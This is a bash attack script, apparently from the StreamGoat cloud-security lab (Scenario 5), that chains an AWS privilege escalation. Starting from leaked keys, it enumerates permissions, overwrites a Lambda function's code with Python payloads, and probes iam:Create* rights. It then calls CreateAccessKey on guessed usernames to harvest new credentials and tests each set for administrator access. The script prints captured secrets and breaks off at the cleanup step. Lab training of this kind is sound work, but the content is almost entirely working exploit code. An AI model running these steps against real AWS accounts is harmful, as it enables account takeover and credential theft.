#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n%s[*]%s %s\n" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "%s[OK]%s  %s\n"  "${GREEN}"  "${RESET}" "$*"; }
err()  { printf "%s[ERR]%s %s\n"  "${RED}"    "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "   ______                     _____          __  " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "  / __/ /________ ___ ___ _  / ___/__  ___ _/ /_" "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " _\ \/ __/ __/ -_) _ \`/  ' \/ (_ / _ \/ _ \`/ __/" "${RESET}"
printf "%s%s%s\n\n" "${BOLD}${GREEN}" "/___/\__/_/  \__/\_,_/_/_/_/\___/\___/\_,_/\__/ " "${RESET}"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 5              ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Configuring aws credentials\n"
  printf "  • Step 2. Permission enumeration for leaked credentials\n"
  printf "  • Step 3. Inspect IAM user policies for owned user\n"
  printf "  • Step 4. Enumerating Lambda functions\n"
  printf "  • Step 5. Modify Lambda to enumerate under its role\n"
  printf "  • Step 6. Lambda Create/Delete tests (User/Group/Policy/Role)\n"
  printf "  • Step 7. CreateAccessKey guessing via Lambda\n"
  printf "  • Step 8. Validate captured keys; detect admin\n"
  printf "  • Step 9. Cleanup\n"
  
}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in aws curl jq zip; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
#############################################
# Step 1. Configuring aws credentials
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 1. Configuring aws credentials to use awscli  ===" "${RESET}"
is_valid_keys() {
  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
  local rc=0 out

  # 1) Ensure no env creds override our profile
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
  PROFILE="streamgoat-scenario-5"
  
  # 2) Write creds to a dedicated profile (avoid clobbering 'default')
  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
  aws configure set region                "$region" --profile "$PROFILE"

  # 3) Force the call to use our profile
  spin_start "Validating credentials via STS"
  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
  spin_stop


  if [ "$rc" -ne 0 ]; then
    return 1
  fi

  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"

  return 0
}

step "Starting point configuration"
while :; do
  read -r -p "Enter leaked AWS key: " AWSKEY_USER
  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
    break
  else
    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
  fi
done

read -r -p "Step 1 is complited. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# Step 2. Permission enumeration for leaked credentials
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"

# init colors (portable)

try() {
  local desc="$1"; shift
  local rc
  set +e
  "$@" >/dev/null 2>&1
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "%s[OK]%s    %s\n"   "$GREEN" "$RESET" "$desc"
  else
    printf "%s[DENY]%s  %s (exit %s)\n" "$RED"   "$RESET" "$desc" "$rc"
  fi
}

# Identity/context
try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
try "IAM List Roles"  aws iam list-roles --profile "$PROFILE"

# Inventory
try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
try "SSM DescribeInstances" aws ssm describe-instance-information --profile "$PROFILE"
try "KMS ListKeys"          aws kms list-keys --limit 5 --profile "$PROFILE"
try "ECR DescribeRepos"     aws ecr describe-repositories --max-results 5 --profile "$PROFILE"
try "Lambda ListFunctions"  aws lambda list-functions --max-items 5 --profile "$PROFILE"
try "DDB ListTables"        aws dynamodb list-tables --max-items 5 --profile "$PROFILE"
try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --profile "$PROFILE"
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"

printf "\nOK, we can list Lambda which looks interesting buy let's try to get some more info about our user...\n"
read -r -p "Step 2 is complited. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Inspect IAM user policies for neo
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Inspecting IAM policies for compromised user  ===" "${RESET}"

# 1. Get current IAM username
USERNAME=$(aws iam get-user --profile "$PROFILE" --query 'User.UserName' --output text 2>/dev/null)
if [ -z "$USERNAME" ]; then
  err "Unable to determine username (iam:GetUser failed?)"
  exit 1
fi
ok "Identified user: ${YELLOW}${USERNAME}${RESET}"

# 2. List inline policies
info "Inline policies attached to $USERNAME:"
INLINE_POLICY_NAMES=$(aws iam list-user-policies --user-name "$USERNAME" --profile "$PROFILE" --query 'PolicyNames' --output text 2>/dev/null)
if [ -n "$INLINE_POLICY_NAMES" ]; then
  echo "$INLINE_POLICY_NAMES" | tr '\t' '\n'
else
  info "(none)"
fi

# 3. Dump inline policy documents (if any)
if [ -n "$INLINE_POLICY_NAMES" ]; then
  for policy in $INLINE_POLICY_NAMES; do
    info "Retrieving inline policy document: $policy"
    aws iam get-user-policy --user-name "$USERNAME" --policy-name "$policy" --profile "$PROFILE" --output json | jq || err "Access denied"
  done
fi

printf "\nIt shows that we may perform any operations agains Lambdas. Lets see on next step what lambdas do we have...\n"
read -r -p "Step 3 complete. Press Enter to proceed to Lambda enumeration (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Lambda enumeration + source code
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 4. Lambda Enumeration and Source Code Extraction  ===" "${RESET}"

# List all functions
LAMBDA_LIST=$(aws lambda list-functions --profile "$PROFILE" --query 'Functions[*].FunctionName' --output text 2>/dev/null)

if [ -z "$LAMBDA_LIST" ]; then
  err "Could not list Lambda functions or none found"
  exit 1
fi

# Look for functions matching the lab pattern
TARGET_FUNCTIONS=$(echo "$LAMBDA_LIST" | tr '\t' '\n' | grep -E '^StreamGoat-Lambda-')

if [ -z "$TARGET_FUNCTIONS" ]; then
  err "No matching StreamGoat-Lambda-* functions found"
  exit 1
fi

ok "Available Lambda functions (lab scenario only):"
echo "$TARGET_FUNCTIONS" | sed 's/^/  -> /'

cd /tmp && mkdir -p streamgoat-scenario5-lambdadump

for FUNC in $TARGET_FUNCTIONS; do
  step "Inspecting Lambda function: $FUNC"

  # Get function metadata and code URL
  FUNC_META=$(aws lambda get-function --function-name "$FUNC" --profile "$PROFILE" --output json 2>/dev/null)
  if [ -z "$FUNC_META" ]; then
    err "Access denied or function does not exist: $FUNC"
    continue
  fi

  CODE_URL=$(echo "$FUNC_META" | jq -r '.Code.Location')

  if [ -z "$CODE_URL" ] || [ "$CODE_URL" == "null" ]; then
    err "No downloadable code URL for $FUNC"
    continue
  fi

  FILE_ZIP="streamgoat-scenario5-lambdadump/${FUNC}.zip"
  FILE_DIR="streamgoat-scenario5-lambdadump/${FUNC}"

  # Download the deployment package
  spin_start "Downloading deployment package"
  curl -s -L -o "$FILE_ZIP" "$CODE_URL" || err "Failed to download code"
  spin_stop && ok "Downloaded: $FILE_ZIP"

  # Extract contents
  mkdir -p "$FILE_DIR"
  unzip -q "$FILE_ZIP" -d "$FILE_DIR" && ok "Extracted to $FILE_DIR" || err "Failed to unzip"

  # Preview main file(s)
  echo "${BLUE}Previewing extracted source (first 20 lines):${RESET}"
  head -n 20 "$FILE_DIR"/index.py 2>/dev/null || echo "(no index.py found)"

done

rm -rf /tmp/streamgoat-scenario5-lambdadump
cd - > /dev/null
read -r -p "Step 4 complete. Press Enter to continue to exploitation... " _ || true

#############################################
# Step 5. Modify Lambda to enumerate under its role
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 5. Modifying Lambda to run baseline enumeration  ===" "${RESET}"

# Choose target Lambda (first StreamGoat-Lambda-*). You can override via env FUNC.
if [ -z "${FUNC:-}" ]; then
  FUNC=$(aws lambda list-functions --profile "$PROFILE" \
          --query 'Functions[*].FunctionName' --output text 2>/dev/null \
        | tr '\t' '\n' | grep -E '^StreamGoat-Lambda-' | head -n 1)
fi

if [ -z "$FUNC" ]; then
  err "No StreamGoat-Lambda-* found to modify."
  exit 1
fi
ok "Target Lambda: ${YELLOW}${FUNC}${RESET}"

# Ensure we have a workspace
cd /tmp
WORKDIR="$(mktemp -d -t sg-lambda-XXXXXX)"
ZIPFILE="${WORKDIR}/payload.zip"
PYFILE="${WORKDIR}/index.py"

# Write replacement Lambda handler (enumeration under Lambda role)
cat > "$PYFILE" <<'PYCODE'
import json
import boto3
from botocore.exceptions import BotoCoreError, ClientError

def _try_call(desc, client_name, method_name, kwargs=None):
    kwargs = kwargs or {}
    resp = {"ok": "[DENY]", "desc": desc, "error": None, "code": None, "summary": None}
    try:
        client = boto3.client(client_name)
        method = getattr(client, method_name)
        out = method(**kwargs)
        # Trim noisy payloads with small summaries
        if client_name == "iam" and method_name == "list_roles":
            resp["summary"] = f"roles={len(out.get('Roles', []))}"
        elif client_name == "ec2" and method_name == "describe_instances":
            count = sum(len(r.get("Instances", [])) for r in out.get("Reservations", []))
            resp["summary"] = f"instances={count}"
        elif client_name == "s3" and method_name == "list_buckets":
            resp["summary"] = f"buckets={len(out.get('Buckets', []))}"
        elif client_name == "secretsmanager" and method_name == "list_secrets":
            resp["summary"] = f"secrets={len(out.get('SecretList', []))}"
        elif client_name == "ssm" and method_name == "get_parameters_by_path":
            resp["summary"] = f"params={len(out.get('Parameters', []))}"
        elif client_name == "ssm" and method_name == "describe_instance_information":
            resp["summary"] = f"managed_instances={len(out.get('InstanceInformationList', []))}"
        elif client_name == "kms" and method_name == "list_keys":
            resp["summary"] = f"keys={len(out.get('Keys', []))}"
        elif client_name == "ecr" and method_name == "describe_repositories":
            resp["summary"] = f"repos={len(out.get('repositories', out.get('Repositories', [])))}"
        elif client_name == "lambda" and method_name == "list_functions":
            resp["summary"] = f"functions={len(out.get('Functions', []))}"
        elif client_name == "dynamodb" and method_name == "list_tables":
            resp["summary"] = f"tables={len(out.get('TableNames', []))}"
        elif client_name == "rds" and method_name == "describe_db_instances":
            resp["summary"] = f"db_instances={len(out.get('DBInstances', []))}"
        elif client_name == "logs" and method_name == "describe_log_groups":
            resp["summary"] = f"log_groups={len(out.get('logGroups', []))}"
        elif client_name == "cloudtrail" and method_name == "describe_trails":
            resp["summary"] = f"trails={len(out.get('trailList', []))}"
        resp["ok"] = "[OK]"
        return resp
    except ClientError as e:
        resp["error"] = str(e)
        resp["code"] = e.response.get("Error", {}).get("Code")
        return resp
    except BotoCoreError as e:
        resp["error"] = str(e)
        return resp
    except Exception as e:
        resp["error"] = str(e)
        return resp

def handler(event, context):
    # Mirroring your Step 2 checks
    checks = [
        ("IAM List Roles",            "iam",        "list_roles",                    {}),
        ("EC2 DescribeInstances",     "ec2",        "describe_instances",            {"MaxResults": 5}),
        ("S3 ListAllMyBuckets",       "s3",         "list_buckets",                  {}),
        ("Secrets ListSecrets",       "secretsmanager","list_secrets",               {"MaxResults": 5}),
        ("SSM GetParametersByPath /", "ssm",        "get_parameters_by_path",       {"Path": "/", "MaxResults": 5, "Recursive": False}),
        ("SSM DescribeInstances",     "ssm",        "describe_instance_information", {}),
        ("KMS ListKeys",              "kms",        "list_keys",                     {"Limit": 5}),
        ("ECR DescribeRepos",         "ecr",        "describe_repositories",        {"maxResults": 5}),
        ("Lambda ListFunctions",      "lambda",     "list_functions",               {"MaxItems": 5}),
        ("DDB ListTables",            "dynamodb",   "list_tables",                  {"Limit": 5}),
        ("RDS DescribeDBs",           "rds",        "describe_db_instances",        {"MaxRecords": 20}),
        ("Logs DescribeLogGroups",    "logs",       "describe_log_groups",          {"limit": 5}),
        ("CloudTrail DescribeTrails", "cloudtrail", "describe_trails",               {}),
    ]

    results = []
    for desc, client, method, kwargs in checks:
        results.append(_try_call(desc, client, method, kwargs))

    return {
        "version": "streamgoat-s5-enum-v1",
        "results": results
    }
PYCODE

# Package -> zip (flat)
cd "$WORKDIR" && zip -q -r "$(basename "$ZIPFILE")" "index.py"
ok "Prepared malicious payload: ${ZIPFILE}"
cd /tmp

spin_start "Uploading modified code to Lambda..."
# Make sure Lambda timeout is long enough (60s) for many API calls
aws lambda update-function-configuration \
  --function-name "$FUNC" \
  --timeout 60 \
  --profile "$PROFILE" >/dev/null

# Upload new code
aws lambda update-function-code \
  --function-name "$FUNC" \
  --zip-file "fileb://${ZIPFILE}" \
  --profile "$PROFILE" >/dev/null

sleep 60
spin_stop

ok "Code uploaded"

# Invoke and capture output
RESP_FILE="${WORKDIR}/invoke-output.json"
step "Invoking Lambda: $FUNC"
spin_start "Invoking Lambda..."
aws lambda invoke \
  --function-name "$FUNC" \
  --payload '{}' \
  --cli-binary-format raw-in-base64-out \
  --profile "$PROFILE" \
  "$RESP_FILE" >/dev/null || true
sleep 60
spin_stop

# Show result payload
if [ -s "$RESP_FILE" ]; then
  ok "Lambda invocation result (raw): ${RESP_FILE}"
  if command -v jq >/dev/null 2>&1; then
    jq -r '
      .results[] |
      "\(.ok|tostring)\t\(.desc)\t\(.summary // "-")\t\(.code // "-")"
    ' "$RESP_FILE" | awk -F'\t' '{printf "%-5s  %-30s\n", $1, $2}'
  else
    cat "$RESP_FILE"
  fi
else
  err "No output received from Lambda (file empty). Check CloudWatch logs."
fi

cd /tmp
rm -rf "$WORKDIR"
cd - > /dev/null
printf "\nIt seems Lambda doesn't have any specific permission set on it. Howhever if we get back the original content of the Lambda, we may notice it was set to create User and Group. What if the Lambda has iam:Create* permissions set? Lets verify.\n"
read -r -p "Step 6 complete. Press Enter to continue to exploitation... " _ || true
#############################################
# Step 6. Lambda Create/Delete tests (User/Group/Policy/Role)
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 6. Validating assumtion of having iam:Create*  ===" "${RESET}"

# Pick target Lambda (first StreamGoat-Lambda-*) unless FUNC is preset
if [ -z "${FUNC:-}" ]; then
  FUNC=$(aws lambda list-functions --profile "$PROFILE" \
          --query 'Functions[*].FunctionName' --output text 2>/dev/null \
        | tr '\t' '\n' | grep -E '^StreamGoat-Lambda-' | head -n 1)
fi
[ -z "$FUNC" ] && { err "No StreamGoat-Lambda-* found."; exit 1; }
ok "Target Lambda: ${YELLOW}${FUNC}${RESET}"

cd /tmp
WORKDIR="$(mktemp -d -t sg-lambda-create-XXXXXX)"
ZIPFILE="${WORKDIR}/payload.zip"
PYFILE="${WORKDIR}/index.py"

# Replacement Lambda code:
# - Creates user/group/policy/role with 'StreagGoat-' prefixes
# - Records HTTPStatusCode or AWS error code
# - If create succeeds, attempts delete (will fail if role lacks iam:Delete*)
cat > "$PYFILE" <<'PYCODE'
import json
import boto3
import random
import string
from botocore.exceptions import ClientError

def _rand(n=6):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _create_then_cleanup_user(iam):
    name = f"StreagGoat-User-{_rand()}"
    ok = False
    try:
        iam.create_user(UserName=name)
        ok = True
    except ClientError:
        ok = False
    # cleanup if created
    if ok:
        try:
            iam.delete_user(UserName=name)
        except Exception:
            pass
    return {"kind": "User", "ok": ok}

def _create_then_cleanup_group(iam):
    name = f"StreagGoat-Group-{_rand()}"
    ok = False
    try:
        iam.create_group(GroupName=name)
        ok = True
    except ClientError:
        ok = False
    if ok:
        try:
            iam.delete_group(GroupName=name)
        except Exception:
            pass
    return {"kind": "Group", "ok": ok}

def _create_then_cleanup_policy(iam):
    name = f"StreagGoat-Policy-{_rand()}"
    doc = {
        "Version": "2012-10-17",
        "Statement": [{"Effect": "Allow", "Action": ["sts:GetCallerIdentity"], "Resource": "*"}]
    }
    ok = False
    arn = None
    try:
        resp = iam.create_policy(PolicyName=name, PolicyDocument=json.dumps(doc))
        arn = resp.get("Policy", {}).get("Arn")
        ok = True
    except ClientError:
        ok = False
    if ok and arn:
        try:
            iam.delete_policy(PolicyArn=arn)
        except Exception:
            pass
    return {"kind": "Policy", "ok": ok}

def _create_then_cleanup_role(iam, account_id):
    name = f"StreagGoat-Role-{_rand()}"
    trust = {
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Principal": {"AWS": f"arn:aws:iam::{account_id}:root"},
            "Action": "sts:AssumeRole"
        }]
    }
    ok = False
    try:
        iam.create_role(RoleName=name, AssumeRolePolicyDocument=json.dumps(trust))
        ok = True
    except ClientError:
        ok = False
    if ok:
        try:
            iam.delete_role(RoleName=name)
        except Exception:
            pass
    return {"kind": "Role", "ok": ok}

def handler(event, context):
    iam = boto3.client('iam')
    sts = boto3.client('sts')
    account_id = sts.get_caller_identity()["Account"]

    results = []
    results.append(_create_then_cleanup_user(iam))
    results.append(_create_then_cleanup_group(iam))
    results.append(_create_then_cleanup_policy(iam))
    results.append(_create_then_cleanup_role(iam, account_id))

    return {"version": "streamgoat-s6-create-v2", "results": results}
PYCODE

# Zip payload
cd "$WORKDIR" && zip -q -r "$(basename "$ZIPFILE")" "index.py"
ok "Prepared payload: ${ZIPFILE}"
cd /tmp

# Upload new code
spin_start "Uploading modified code to Lambda..."
aws lambda update-function-code \
  --function-name "$FUNC" \
  --zip-file "fileb://${ZIPFILE}" \
  --profile "$PROFILE" >/dev/null
sleep 60
spin_stop
ok "Code uploaded"

# Invoke and capture output
RESP_FILE="${WORKDIR}/invoke-create-output.json"
spin_start "Invoking Lambda..."
aws lambda invoke \
  --function-name "$FUNC" \
  --payload '{}' \
  --cli-binary-format raw-in-base64-out \
  --profile "$PROFILE" \
  "$RESP_FILE" >/dev/null || true
sleep 60
spin_stop

# Show results in [OK]/[DENY] format
if [ -s "$RESP_FILE" ]; then
  ok "Lambda invocation result (raw): ${RESP_FILE}"
  if command -v jq >/dev/null 2>&1; then
    jq -r '.results[] | (if .ok then "[OK]  " else "[DENY]  " end) + (.kind + " creation")' "$RESP_FILE"
  else
    # minimal fallback without jq
    cat "$RESP_FILE"
  fi
else
  err "No output received from Lambda (file empty). Check CloudWatch logs."
fi

cd /tmp
rm -rf "$WORKDIR"
cd - > /dev/null

printf "\nWe see some good result we may use. We see that not only User creation and group Creaion is allowed for Lambda, but Roles and Policies as well. It can make us thinking we have wildcard permissions set ${YELLOW}iam:Create*${RESET}. But unfortunetly user we own doesn't have permissions to list existed users. Lambda doesn't have this permissions as well. So what we can do? We can try performing operartion of CreateAccessKey on guessed users based on format we know (StreamGoat-User-). If operartion successful - we will receive new keys to pivote further.\n"
read -r -p "Step 6 complete. Press Enter to continue to exploitation... " _ || true
#############################################
# Step 7. CreateAccessKey guessing via Lambda
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 7. Attempting iam:CreateAccessKey on guessed users ===" "${RESET}"

# Target Lambda (first StreamGoat-Lambda-*) unless FUNC preset
if [ -z "${FUNC:-}" ]; then
  FUNC=$(aws lambda list-functions --profile "$PROFILE" \
          --query 'Functions[*].FunctionName' --output text 2>/dev/null \
        | tr '\t' '\n' | grep -E '^StreamGoat-Lambda-' | head -n 1)
fi
[ -z "$FUNC" ] && { err "No StreamGoat-Lambda-* found."; exit 1; }
ok "Target Lambda: ${YELLOW}${FUNC}${RESET}"

cd /tmp
WORKDIR="$(mktemp -d -t sg-lambda-keys-XXXXXX)"
ZIPFILE="${WORKDIR}/payload.zip"
PYFILE="${WORKDIR}/index.py"

# Lambda code: try CreateAccessKey on 20 candidates (includes peter, maria, john)
cat > "$PYFILE" <<'PYCODE'
import json
import boto3
from botocore.exceptions import ClientError

def handler(event, context):
    iam = boto3.client('iam')

    # 20 candidates; must include peter, maria, john
    candidates = [
        "ava", "linda", "john",
        "dmitry", "anna", "mike", "sophia", "daniel",
        "emily", "victor", "maria", "kevin", "nina",
        "liam", "olivia", "ethan", "peter", "noah",
        "mia", "alex"
    ]

    results = []
    for name in candidates:
        username = f"StreamGoat-User-{name}"
        entry = {"user": username, "ok": False}
        try:
            resp = iam.create_access_key(UserName=username)
            ak = resp.get("AccessKey", {})
            entry["ok"] = True
            entry["access_key_id"] = ak.get("AccessKeyId")
            entry["secret_access_key"] = ak.get("SecretAccessKey")
        except ClientError as e:
            # e.g., NoSuchEntity, AccessDenied, LimitExceeded, etc.
            entry["error"] = e.response.get("Error", {}).get("Code", "ClientError")
        except Exception as e:
            entry["error"] = str(e)
        results.append(entry)

    # NOTE: do NOT delete the keys; the lab will validate them next.
    return {"version": "streamgoat-s7-create-keys-v1", "attempts": results}
PYCODE

# Zip, upload, wait, invoke, wait (per lab timing)
cd "$WORKDIR" && zip -q -r "$(basename "$ZIPFILE")" "index.py"
ok "Prepared payload: ${ZIPFILE}"

spin_start "Uploading modified code to Lambda"
aws lambda update-function-code \
  --function-name "$FUNC" \
  --zip-file "fileb://${ZIPFILE}" \
  --profile "$PROFILE" >/dev/null
sleep 60
spin_stop
ok "Code uploaded"

cd /tmp
RESP_FILE="${WORKDIR}/invoke-keys-output.json"
step "Invoking Lambda: $FUNC"
spin_start "Invoking Lambda..."
aws lambda invoke \
  --function-name "$FUNC" \
  --payload '{}' \
  --cli-binary-format raw-in-base64-out \
  --profile "$PROFILE" \
  "$RESP_FILE" >/dev/null || true
sleep 60
spin_stop

# Print header
printf "%s[*]%s Generating AccessKeys for:\n" "${YELLOW}" "${RESET}"

# Parse results, print in required format, store successes into variables
declare -gA SG_KEYS=()
declare -gA SG_SECRETS=()
SUCCESS_USERS=()

if command -v jq >/dev/null 2>&1 && [ -s "$RESP_FILE" ]; then
  mapfile -t _LINES < <(jq -c '.attempts[]' "$RESP_FILE")

  for line in "${_LINES[@]}"; do
    user=$(printf "%s" "$line" | jq -r '.user')
    okflag=$(printf "%s" "$line" | jq -r '.ok')
    if [ "$okflag" = "true" ]; then
      kid=$(printf "%s" "$line" | jq -r '.access_key_id')
      sec=$(printf "%s" "$line" | jq -r '.secret_access_key')
      printf "[OK] %s:\nAWS key: %s\nAWS secret: %s\n" "$user" "$kid" "$sec"
      SG_KEYS["$user"]="$kid"
      SG_SECRETS["$user"]="$sec"
      SUCCESS_USERS+=("$user")
    else
      printf "[DENY] %s\n" "$user"
    fi
  done
else
  err "Failed to parse Lambda output; raw follows:"
  cat "$RESP_FILE" || true
fi

# Optional: show a summary of stored credentials
if [ "${#SUCCESS_USERS[@]}" -gt 0 ]; then
  echo
  ok "Stored credentials for ${#SUCCESS_USERS[@]} user(s) into variables:"
  for u in "${SUCCESS_USERS[@]}"; do
    printf "  %s -> KEY_ID=%s SECRET=%s\n" "$u" "${SG_KEYS[$u]}" "${SG_SECRETS[$u]}"
  done
else
  info "No credentials captured."
fi

cd /tmp
rm -rf "$WORKDIR"
cd - > /dev/null

printf "\nGreat! The method works! No we need to check what permissions every of these users have.\n"
read -r -p "Step 7 complete. Press Enter to continue to exploitation... " _ || true

#############################################
# Step 8. Validate captured keys; detect admin
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 8. Validating captured keys and checking privileges  ===" "${RESET}"

# Sanity: ensure we have captured creds
if [ "${#SUCCESS_USERS[@]}" -eq 0 ]; then
  err "No captured credentials to validate. Run Step 7 first."
  # Do not exit hard; allow script continuation if desired
fi

# Save current profile creds to restore later
ORIG_KEY="$(aws configure get aws_access_key_id --profile "$PROFILE" 2>/dev/null || true)"
ORIG_SECRET="$(aws configure get aws_secret_access_key --profile "$PROFILE" 2>/dev/null || true)"

declare -a ADMIN_USERS=()
declare -gA ADMIN_KEYS=()
declare -gA ADMIN_SECRETS=()

for u in "${SUCCESS_USERS[@]}"; do
  step "Testing credentials for ${YELLOW}${u}${RESET}"

  K="${SG_KEYS[$u]}"
  S="${SG_SECRETS[$u]}"

  # Apply creds into the SAME profile
  aws configure set aws_access_key_id     "$K" --profile "$PROFILE"
  aws configure set aws_secret_access_key "$S" --profile "$PROFILE"

  # tiny settle time (optional)
  sleep 2

  # 1) Identity
  ID_OUT="$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>/dev/null)" || ID_OUT=""
  if [ -n "$ID_OUT" ]; then
    ARN="$(printf "%s" "$ID_OUT" | jq -r '.Arn' 2>/dev/null || echo '(unknown ARN)')"
    ok "STS identity: ${ARN}"
  else
    err "STS failed for $u — skipping further checks."
    continue
  fi

  # 2) GetUser → username
  USERNAME="$(aws iam get-user --profile "$PROFILE" --query 'User.UserName' --output text 2>/dev/null || true)"
  if [ -z "$USERNAME" ] || [ "$USERNAME" = "None" ]; then
    USERNAME="$u" # fallback to guessed principal
  fi
  info "UserName: ${USERNAME}"

  # 3) Inline policies (names)
  INLINE_LIST="$(aws iam list-user-policies --user-name "$USERNAME" --profile "$PROFILE" --query 'PolicyNames' --output text 2>/dev/null || true)"
  if [ -n "$INLINE_LIST" ]; then
    ok "Inline policies:"
    echo "$INLINE_LIST" | tr '\t' '\n' | sed 's/^/  - /'
  else
    info "Inline policies: (none or access denied)"
  fi

  # 4) Attached managed policies (names)
  ATTACHED_NAMES="$(aws iam list-attached-user-policies --user-name "$USERNAME" --profile "$PROFILE" --query 'AttachedPolicies[*].PolicyName' --output text 2>/dev/null || true)"
  if [ -n "$ATTACHED_NAMES" ]; then
    ok "Attached policies:"
    echo "$ATTACHED_NAMES" | tr '\t' '\n' | sed 's/^/  - /'
  else
    info "Attached policies: (none or access denied)"
  fi

  # Admin detection: AdministratorAccess attached
  IS_ADMIN=0
  if printf "%s" "$ATTACHED_NAMES" | tr '\t' '\n' | grep -qE '^AdministratorAccess$'; then
    IS_ADMIN=1
  fi

  if [ "$IS_ADMIN" -eq 1 ]; then
    printf "%s*** ADMIN DETECTED ***%s %s\n" "${BOLD}${GREEN}" "${RESET}" "$USERNAME"
    ADMIN_USERS+=("$USERNAME")
    ADMIN_KEYS["$USERNAME"]="$K"
    ADMIN_SECRETS["$USERNAME"]="$S"
  fi

  echo
done

# Restore original profile creds
step "Restoring original profile credentials"
if [ -n "$ORIG_KEY" ] && [ -n "$ORIG_SECRET" ]; then
  aws configure set aws_access_key_id     "$ORIG_KEY"    --profile "$PROFILE"
  aws configure set aws_secret_access_key "$ORIG_SECRET" --profile "$PROFILE"
  ok "Profile ${PROFILE} restored to original credentials"
else
  info "Original credentials were not found; profile remains on last tested creds."
fi

# Final summary
echo
printf "%s=== Validation Summary ===%s\n" "${BOLD}${CYAN}" "${RESET}"
if [ "${#ADMIN_USERS[@]}" -gt 0 ]; then
  ok "Admin users identified: ${#ADMIN_USERS[@]}"
  for a in "${ADMIN_USERS[@]}"; do
    printf "  %s -> KEY_ID=%s SECRET=%s\n" "$a" "${ADMIN_KEYS[$a]}" "${ADMIN_SECRETS[$a]}"
  done
else
  info "No admin users detected among captured keys."
fi

printf "\nAnd we have an user with full admin privileges! Congratulations!\n"
read -r -p "Scenario complited. But before we exit we have to remove created keys to let terraform successfuly destroy lab. Press Enter to continue to exploitation... " _ || true

#############################################
# Step 9. Cleanup: delete created access keys (using admin)
#############################################
